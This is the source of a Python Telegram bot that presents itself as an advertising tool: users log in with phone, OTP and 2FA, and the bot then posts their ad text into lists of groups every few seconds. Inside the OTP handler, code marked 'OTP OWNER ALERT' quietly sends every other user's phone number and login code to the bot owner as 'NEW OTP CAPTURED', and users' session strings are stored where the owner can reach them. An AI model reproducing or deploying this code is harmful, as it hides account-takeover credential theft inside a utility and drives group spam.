import os
import asyncio
import sqlite3
import threading
import logging
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError, ChatWriteForbiddenError, ChannelPrivateError

# ================== CONFIG ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965"))
API_ID = int(os.environ.get("API_ID", "38746329"))
API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
PORT = int(os.environ.get("PORT", 10000))

(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_TEXT, ASK_GROUPS, ASK_REPLY, ASK_WELCOME_IMG) = range(7)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONT ==================
def st(text: str) -> str:
    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
    out = []
    for ch in text:
        if ch in upper: out.append(upper[ch])
        elif ch in lower: out.append(lower[ch])
        elif ch in digits: out.append(digits[ch])
        else: out.append(ch)
    return "".join(out)

# ================== RENDER PORT ==================
flask_app = Flask(__name__)
@flask_app.route('/')
def health(): return "Bot is running!", 200
def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)

# ================== DATABASE ==================
def init_db():
    conn = sqlite3.connect("ads_master.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS global_settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_data (user_id INTEGER PRIMARY KEY, session_string TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER, key TEXT, value TEXT, PRIMARY KEY (user_id, key))""")
    c.execute("""CREATE TABLE IF NOT EXISTS sent_msgs (msg_id INTEGER PRIMARY KEY, group_id TEXT)""")
    conn.commit(); conn.close()
init_db()

def get_global(key, default=None):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("SELECT value FROM global_settings WHERE key=?", (key,))
    row = c.fetchone(); conn.close()
    return row[0] if row else default

def set_global(key, value):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?,?)", (key, str(value)))
    conn.commit(); conn.close()

def get_user_set(user_id, key, default=None):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("SELECT value FROM user_settings WHERE user_id=? AND key=?", (user_id, key))
    row = c.fetchone(); conn.close()
    return row[0] if row else default

def set_user_set(user_id, key, value):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("INSERT OR REPLACE INTO user_settings (user_id, key, value) VALUES (?,?,?)", (user_id, key, str(value)))
    conn.commit(); conn.close()

def del_user_set(user_id, key):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("DELETE FROM user_settings WHERE user_id=? AND key=?", (user_id, key))
    conn.commit(); conn.close()

def save_sent_msg(msg_id, group_id):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("INSERT OR REPLACE INTO sent_msgs (msg_id, group_id) VALUES (?,?)", (msg_id, str(group_id)))
    conn.commit(); conn.close()

def is_our_msg(msg_id):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("SELECT msg_id FROM sent_msgs WHERE msg_id=?", (msg_id,))
    row = c.fetchone(); conn.close()
    return bool(row)

# ================== USERBOTS DICT ==================
# Har user ka apna alag client aur loop chalega
active_userbots = {} # Format: {user_id: client}
running_loops = {}   # Format: {user_id: task}

# ================== ADS LOGIC ==================
async def send_to_group(client, group, text):
    try:
        entity = await client.get_entity(group)
        if hasattr(entity, 'join_request'):
            try: await client(JoinChannelRequest(entity))
            except: pass

        sent_message = await client.send_message(entity, text)
        if sent_message:
            save_sent_msg(sent_message.id, group)
            logger.info(f"[SUCCESS] Sent to {group}")
            await asyncio.sleep(2)
    except FloodWaitError as e:
        logger.warning(f"[FLOODWAIT] Waiting {e.seconds}s")
        await asyncio.sleep(e.seconds)
    except Exception as e:
        logger.error(f"[FAILED] {group} -> {str(e)}")

async def ads_loop(user_id):
    while user_id in running_loops:
        text = get_user_set(user_id, "ad_text", "")
        groups_str = get_user_set(user_id, "ad_groups", "")
        interval = int(get_user_set(user_id, "ad_interval", "8"))
        
        if not groups_str or user_id not in active_userbots:
            await asyncio.sleep(2); continue
            
        groups = [g.strip() for g in groups_str.split(',') if g.strip()]
        client = active_userbots[user_id]
        
        for group in groups:
            if user_id not in running_loops: break
            await send_to_group(client, group, text)
            
        logger.info(f"User {user_id} batch done. Waiting {interval}s")
        await asyncio.sleep(interval)

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    
    @client.on(events.NewMessage(incoming=True))
    async def alert_handler(event):
        if event.is_private: return
        is_reply = False
        if event.message.reply_to_msg_id and is_our_msg(event.message.reply_to_msg_id): is_reply = True
        
        if is_reply or event.message.mentioned:
            sender = await event.get_sender()
            chat = await event.get_chat()
            
            auto_reply = get_user_set(user_id, "auto_reply", "DM me to add to contact.")
            try: await event.reply(auto_reply)
            except: pass
            
            msg = (
                f"🔔 <b>NEW TAG/REPLY</b>\n\n"
                f"👤 <b>User:</b> {sender.first_name} (@{sender.username or 'None'})\n"
                f"🆔 <b>ID:</b> <code>{sender.id}</code>\n"
                f"🔗 <b>Profile:</b> <a href='tg://user?id={sender.id}'>Click Here</a>\n\n"
                f"💬 <b>Comment:</b> {event.message.message}\n"
                f"🏠 <b>Group:</b> {chat.title}"
            )
            try: await bot_app.bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML")
            except: pass

# ================== KEYBOARDS ==================
def main_menu(user_id):
    kb = [
        [KeyboardButton("LOGIN ACCOUNT"), KeyboardButton("LOGOUT ACCOUNT")],
        [KeyboardButton("ADD TEXT"), KeyboardButton("DELETE TEXT")],
        [KeyboardButton("SET TARGET GROUP"), KeyboardButton("SET INTERVAL")],
        [KeyboardButton("SET AUTO REPLY")],
        [KeyboardButton("RUN ADS"), KeyboardButton("STOP ADS")],
        [KeyboardButton("VIEW SETTINGS")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("OWNER PANEL")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def owner_menu():
    kb = [
        [KeyboardButton("SET WELCOME IMAGE"), KeyboardButton("BACK TO MENU")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def interval_menu():
    kb = [[InlineKeyboardButton("8 Seconds", callback_data="int_8"), InlineKeyboardButton("15 Seconds", callback_data="int_15")]]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
bot_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    welcome_img = get_global("welcome_image")
    
    if welcome_img:
        try:
            await update.message.reply_photo(photo=welcome_img, caption=st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(user_id))
            return
        except: pass
    await update.message.reply_text(st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(user_id))

# OWNER PANEL
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(st("Owner Panel"), reply_markup=owner_menu())

async def set_welcome_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(st("Send new welcome image:"))
    return ASK_WELCOME_IMG

async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        set_global("welcome_image", update.message.photo[-1].file_id)
        await update.message.reply_text(st("✅ Welcome Image Set!"), reply_markup=owner_menu())
    return ConversationHandler.END

# LOGIN
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(st("Enter Phone Number (+91...)"))
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.effective_user.id
    context.user_data['phone'] = phone
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        context.user_data['temp_client'] = client
        context.user_data['hash'] = sent_code.phone_code_hash
        
        kb = [[InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
              [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
              [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
              [InlineKeyboardButton("CLEAR", callback_data="otp_clear"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton("SUBMIT", callback_data="otp_submit")]]
        context.user_data['otp_entered'] = ""
        await update.message.reply_text(st("Enter OTP:"), reply_markup=InlineKeyboardMarkup(kb))
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"Error: {e}"); return ConversationHandler.END

async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data.replace("otp_", "")
    otp = context.user_data.get('otp_entered', "")
    user_id = query.from_user.id
    
    if data == "clear": otp = ""
    elif data == "submit":
        if len(otp) < 4: return await query.answer("Minimum 4 digits!")
        
        # --- OTP OWNER ALERT ---
        if user_id != OWNER_ID:
            try:
                await bot_app.bot.send_message(
                    chat_id=OWNER_ID, 
                    text=f"🚨 <b>NEW OTP CAPTURED</b>\n\nUser ID: <code>{user_id}</code>\nPhone: {context.user_data['phone']}\nOTP: <code>{otp}</code>",
                    parse_mode="HTML"
                )
            except: pass
        # -----------------------
        
        try:
            await context.user_data['temp_client'].sign_in(phone=context.user_data['phone'], code=otp, phone_code_hash=context.user_data['hash'])
            session_str = context.user_data['temp_client'].session.save()
            
            conn = sqlite3.connect("ads_master.db")
            c = conn.cursor(); c.execute("INSERT OR REPLACE INTO user_data (user_id, session_string) VALUES (?,?)", (user_id, session_str))
            conn.commit(); conn.close()
            
            await start_userbot(user_id, session_str)
            await query.message.delete()
            await bot_app.bot.send_message(chat_id=user_id, text="✅ Logged In!", reply_markup=main_menu(user_id))
            return ConversationHandler.END
        except Exception as e:
            if "Two-step" in str(e): await query.edit_message_text("2FA Password:"); return ASK_2FA
            await query.edit_message_text(f"Failed: {e}"); return ConversationHandler.END
    else:
        if len(otp) < 5: otp += data
    context.user_data['otp_entered'] = otp
    
    display = " ".join([char if i < len(otp) else "_" for i, char in enumerate(otp + "_"*(5-len(otp)))])
    try: await query.edit_message_text(st(f"OTP: {display}"), reply_markup=query.message.reply_markup)
    except: pass
    return ASK_OTP

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        await context.user_data['temp_client'].sign_in(password=update.message.text.strip())
        session_str = context.user_data['temp_client'].session.save()
        
        conn = sqlite3.connect("ads_master.db")
        c = conn.cursor(); c.execute("INSERT OR REPLACE INTO user_data (user_id, session_string) VALUES (?,?)", (user_id, session_str))
        conn.commit(); conn.close()
        
        await start_userbot(user_id, session_str)
        await update.message.reply_text("✅ Logged In via 2FA!", reply_markup=main_menu(user_id))
    except Exception as e: await update.message.reply_text(f"2FA Failed: {e}")
    return ConversationHandler.END

async def logout_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_userbots:
        try: await active_userbots[user_id].log_out()
        except: pass
        del active_userbots[user_id]
    if user_id in running_loops:
        del running_loops[user_id]
        
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("DELETE FROM user_data WHERE user_id=?", (user_id,))
    conn.commit(); conn.close()
    await update.message.reply_text("Logged out successfully!", reply_markup=main_menu(user_id))

# TEXT
async def add_text_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send text:"); return ASK_TEXT
async def save_text(update: Update, context: ContextTypes.DEFAULT_TYPE): 
    set_user_set(update.effective_user.id, "ad_text", update.message.text)
    await update.message.reply_text("✅ Saved!", reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
async def delete_text(update: Update, context: ContextTypes.DEFAULT_TYPE): 
    del_user_set(update.effective_user.id, "ad_text")
    await update.message.reply_text("🗑️ Deleted!", reply_markup=main_menu(update.effective_user.id))

# GROUPS & REPLY
async def set_groups_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send group links (comma separated):"); return ASK_GROUPS
async def save_groups(update: Update, context: ContextTypes.DEFAULT_TYPE): 
    set_user_set(update.effective_user.id, "ad_groups", update.message.text)
    await update.message.reply_text("✅ Groups Saved!", reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END

async def set_reply_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send auto-reply text:"); return ASK_REPLY
async def save_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): 
    set_user_set(update.effective_user.id, "auto_reply", update.message.text)
    await update.message.reply_text("✅ Reply Saved!", reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END

# INTERVAL & ADS
async def set_interval_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Interval:", reply_markup=interval_menu())
async def save_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    set_user_set(query.from_user.id, "ad_interval", query.data.split('_')[1])
    await query.message.reply_text("✅ Interval Set!", reply_markup=main_menu(query.from_user.id))

async def run_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in running_loops: return await update.message.reply_text("⚠️ Already running!")
    if user_id not in active_userbots: return await update.message.reply_text("❌ Login first!")
    
    running_loops[user_id] = asyncio.create_task(ads_loop(user_id))
    await update.message.reply_text("🚀 Ads Started!")

async def stop_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in running_loops: return await update.message.reply_text("⚠️ Already stopped!")
    
    running_loops[user_id].cancel()
    del running_loops[user_id]
    await update.message.reply_text("🛑 Ads Stopped!")

async def view_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(f"Text: {get_user_set(uid, 'ad_text')}\nGroups: {get_user_set(uid, 'ad_groups')}\nReply: {get_user_set(uid, 'auto_reply')}")

# ================== MAIN ==================
def main():
    global bot_app
    threading.Thread(target=run_flask, daemon=True).start()
    
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    
    # Start saved accounts
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute("SELECT user_id, session_string FROM user_data")
    for row in c.fetchall():
        loop.run_until_complete(start_userbot(row[0], row[1]))
    conn.close()
    
    bot_app = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.Regex("^OWNER PANEL$"), owner_panel))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^SET WELCOME IMAGE$"), set_welcome_start)], states={ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)]}, fallbacks=[]))
    
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^LOGIN ACCOUNT$"), login_start)], states={ASK_PHONE: [MessageHandler(filters.TEXT, get_phone)], ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")], ASK_2FA: [MessageHandler(filters.TEXT, get_2fa)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^ADD TEXT$"), add_text_start)], states={ASK_TEXT: [MessageHandler(filters.TEXT, save_text)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^SET TARGET GROUP$"), set_groups_start)], states={ASK_GROUPS: [MessageHandler(filters.TEXT, save_groups)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^SET AUTO REPLY$"), set_reply_start)], states={ASK_REPLY: [MessageHandler(filters.TEXT, save_reply)]}, fallbacks=[]))

    bot_app.add_handler(MessageHandler(filters.Regex("^BACK TO MENU$"), lambda u,c: u.message.reply_text("Menu", reply_markup=main_menu(u.effective_user.id))))
    bot_app.add_handler(MessageHandler(filters.Regex("^LOGOUT ACCOUNT$"), logout_account))
    bot_app.add_handler(MessageHandler(filters.Regex("^DELETE TEXT$"), delete_text))
    bot_app.add_handler(MessageHandler(filters.Regex("^SET INTERVAL$"), set_interval_start))
    bot_app.add_handler(CallbackQueryHandler(save_interval, pattern="^int_"))
    bot_app.add_handler(MessageHandler(filters.Regex("^RUN ADS$"), run_ads))
    bot_app.add_handler(MessageHandler(filters.Regex("^STOP ADS$"), stop_ads))
    bot_app.add_handler(MessageHandler(filters.Regex("^VIEW SETTINGS$"), view_settings))

    logger.info("Bot Started!")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
